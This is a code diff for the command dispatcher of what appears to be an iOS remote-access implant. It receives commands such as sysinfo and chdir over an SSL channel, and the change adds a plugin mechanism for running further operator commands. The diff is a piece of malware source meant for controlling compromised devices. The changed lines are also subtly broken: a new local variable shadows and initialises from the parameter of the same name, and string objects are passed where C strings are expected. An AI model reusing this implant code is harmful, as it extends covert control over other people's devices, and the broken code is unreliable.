@@ -29,13 +29,14 @@
 #import "generic.h"
 #import "apple_ios/commands.h"
 
-void stdapi(SSL *channel, char *cmd, char *args)
+void stdapi(SSL *channel, char *cmd, char *args, char *plugin)
 {
     Commands *commands = [[Commands alloc] init];
     commands->channelPipe = channel;
 
     NSString *command = [NSString stringWithFormat:@"%s", cmd];
     NSString *argv = [NSString stringWithFormat:@"%s", args];
+    NSString *plugin = [NSString stringWithFormat:@"%s", plugin];
 
     if ([command isEqualToString:@"sysinfo"])
         [commands cmd_sysinfo];
@@ -68,7 +69,7 @@ void stdapi(SSL *channel, char *cmd, char *args)
     else if ([command isEqualToString:@"chdir"])
         [commands cmd_chdir:argv];
     else {
-        if (![command custom_command:argv])
-            generic(channel, cmd, args);
+        if (![commands execute_plugin:plugin withCmd:command withArgs:argv])
+            generic(channel, command, argv);
     }
 }
